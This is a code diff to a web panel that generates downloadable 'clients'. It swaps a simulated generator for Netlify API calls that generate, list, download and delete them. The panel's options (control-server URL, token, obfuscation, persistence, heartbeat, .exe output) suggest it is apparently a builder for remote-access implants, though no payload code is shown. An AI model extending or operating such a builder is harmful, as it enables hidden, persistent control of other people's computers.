@@ -532,27 +532,32 @@
             showStatus('Generating client...', 'info');
             
             try {
-                // Simulate client generation (in real implementation, this would call the builder API)
-                await simulateClientGeneration(config);
+                const result = await generateClientViaAPI(config);
                 
-                generatedClients.push(config);
-                updateClientsList();
-                
-                const output = document.getElementById('singleOutput');
-                output.style.display = 'block';
-                output.textContent = `✅ Client generated successfully!
-🆔 Client ID: ${config.clientId}
-📁 Template: ${config.template}
-🔗 Server: ${config.serverUrl}
+                if (result.success) {
+                    generatedClients.push(result.client);
+                    updateClientsList();
+                    
+                    const output = document.getElementById('singleOutput');
+                    output.style.display = 'block';
+                    output.textContent = `✅ Client generated successfully!
+🆔 Client ID: ${result.client.clientId}
+📁 Template: ${result.client.template}
+🔗 Server: ${result.client.config.serverUrl}
 🔑 Token: ${config.authToken.substring(0, 8)}...
 ⚙️ Obfuscation: ${config.obfuscate ? 'Enabled' : 'Disabled'}
 🔄 Persistence: ${config.persistence ? 'Enabled' : 'Disabled'}
 📦 Executable: ${config.executable ? 'Yes' : 'No'}
 🔒 Encryption: ${config.encrypted ? 'Enabled' : 'Disabled'}
 ⏱️ Heartbeat: ${config.heartbeatInterval}ms
-📝 Output: ${config.outputName}.js${config.executable ? ' (+ .exe)' : ''}`;
-                
-                showStatus('Client generated successfully!', 'success');
+📝 Output: ${config.outputName}.js${config.executable ? ' (+ .exe)' : ''}
+
+💾 Download: <a href="javascript:void(0)" onclick="downloadClient('${result.client.id}', '${config.outputName}.js')">Click here to download</a>`;
+                    
+                    showStatus('Client generated successfully!', 'success');
+                } else {
+                    showStatus('Failed to generate client: ' + result.error, 'error');
+                }
             } catch (error) {
                 showStatus('Failed to generate client: ' + error.message, 'error');
             }
@@ -608,13 +613,88 @@
             showStatus(`Batch generation complete: ${batchClients.length}/${count} successful`, 'success');
         }
 
-        // Simulate client generation (replace with actual API call)
-        async function simulateClientGeneration(config) {
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    resolve(config);
-                }, 500);
-            });
+        // Generate client via Netlify function
+        async function generateClientViaAPI(config) {
+            try {
+                const response = await fetch('/.netlify/functions/builder/generate', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(config)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+
+                return await response.json();
+            } catch (error) {
+                throw new Error(`API call failed: ${error.message}`);
+            }
+        }
+
+        // Download client code
+        async function downloadClient(clientId, filename) {
+            try {
+                const response = await fetch(`/.netlify/functions/builder/download/${clientId}`);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+
+                const blob = await response.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                showStatus('Client downloaded successfully', 'success');
+            } catch (error) {
+                showStatus('Download failed: ' + error.message, 'error');
+            }
+        }
+
+        // Delete client
+        async function deleteClient(clientId) {
+            try {
+                const response = await fetch(`/.netlify/functions/builder/delete/${clientId}`, {
+                    method: 'DELETE'
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+
+                const result = await response.json();
+                if (result.success) {
+                    showStatus('Client deleted successfully', 'success');
+                    refreshClients();
+                } else {
+                    showStatus('Delete failed: ' + result.error, 'error');
+                }
+            } catch (error) {
+                showStatus('Delete failed: ' + error.message, 'error');
+            }
+        }
+
+        // Get all clients
+        async function getAllClients() {
+            try {
+                const response = await fetch('/.netlify/functions/builder');
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+
+                return await response.json();
+            } catch (error) {
+                throw new Error(`API call failed: ${error.message}`);
+            }
         }
 
         // Generate client ID
@@ -711,6 +791,18 @@
             output.textContent = JSON.stringify(config, null, 2);
         }
 
+        // Refresh clients from server
+        async function refreshClients() {
+            try {
+                const result = await getAllClients();
+                generatedClients = result.clients;
+                updateClientsList();
+                showStatus('Clients refreshed', 'success');
+            } catch (error) {
+                showStatus('Failed to refresh clients: ' + error.message, 'error');
+            }
+        }
+
         // Update clients list
         function updateClientsList() {
             const listDiv = document.getElementById('clientsList');
@@ -723,15 +815,15 @@
             listDiv.innerHTML = generatedClients.map((client, index) => `
                 <div class="client-item">
                     <div class="client-info">
-                        <strong>${client.outputName}</strong><br>
+                        <strong>${client.name}</strong><br>
                         ID: ${client.clientId}<br>
                         Template: ${client.template}<br>
-                        Server: ${client.serverUrl}
+                        Server: ${client.config.serverUrl}<br>
+                        Created: ${new Date(client.timestamp).toLocaleString()}
                     </div>
                     <div class="client-actions">
-                        <button onclick="downloadClient(${index})">Download</button>
-                        <button onclick="viewClient(${index})">View</button>
-                        <button onclick="deleteClient(${index})">Delete</button>
+                        <button onclick="downloadClient('${client.id}', '${client.name}.js')">Download</button>
+                        <button onclick="deleteClient('${client.id}')">Delete</button>
                     </div>
                 </div>
             `).join('');
@@ -758,7 +850,7 @@
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             generateToken();
-            updateClientsList();
+            refreshClients();
         });
     </script>
 </body>
